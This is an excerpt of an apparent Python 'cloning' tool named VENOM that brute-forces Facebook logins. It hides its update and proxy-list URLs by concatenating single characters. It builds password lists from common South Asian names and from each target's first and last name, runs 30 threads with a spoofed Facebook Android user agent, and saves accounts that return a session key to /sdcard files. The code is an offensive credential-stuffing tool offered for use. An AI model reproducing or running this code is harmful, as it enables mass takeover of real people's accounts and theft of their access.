...
try:
     v= requests.get('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'r'+'a'+'w'+'.'+'g'+'i'+'t'+'h'+'u'+'b'+'u'+'s'+'e'+'r'+'c'+'o'+'n'+'t'+'e'+'n'+'t'+'.'+'c'+'o'+'m'+'/'+'V'+'E'+'N'+'O'+'M'+'-'+'7'+'8'+'6'+'/'+'V'+'E'+'N'+'O'+'M'+'/'+'m'+'a'+'i'+'n'+'/'+'V'+'e'+'r'+'s'+'i'+'o'+'n').text
     s = open('Version','r').read()
     if v in s:
         pass
     else:os.system('clear');exit(' [•] Sir New Update Done..! \n [•] You Run This Code..! Copy Then Paste Here \n \n cd -- && rm -rf VENOM\n git clone https://github.com/VENOM-786/VENOM\n cd VENOM && git pull \n python VENOM.py ')
except Exception as e:
    print(' [×] Your Internet Connection Lol..!');exit()
...
try:
    prox=requests.get('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'r'+'a'+'w'+'.'+'g'+'i'+'t'+'h'+'u'+'b'+'u'+'s'+'e'+'r'+'c'+'o'+'n'+'t'+'e'+'n'+'t'+'.'+'c'+'o'+'m'+'/'+'V'+'E'+'N'+'O'+'M'+'-'+'7'+'8'+'6'+'/'+'p'+'r'+'o'+'x'+'/'+'m'+'a'+'i'+'n'+'/'+'p'+'r'+'o'+'x'+'.'+'t'+'x'+'t').text
...
def pak():
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as VENOM:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','57273200','khankhan','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','786787','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','baloch786','baloch12345','khan1122','khan12','i love you','iloveyou','janjan']
...
def gmail():
                ...
                with tred(max_workers=30) as VENOM:
                        ...
                        for user in fo:
                                ...
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs+'123456',ls+'123456',fs,fs+'1234',fs+'786',fs+'12',ls+'123',ls+'1234',ls+'12345',ls+'786',ls+'786',ls+'1122',ls+fs,fs+ls,fs+ls+'123',fs+ls+'12345',fs+ls+'786',fs+ls+'1122',ls+fs+'123',ls+fs+'12345',ls+fs+'786',ls+fs+'1122']
 
                                VENOM.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')

he="[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\33[1m\33[1;35m [VENOM-CP] '+uid+' √ '+pas+'\033[1;97m')
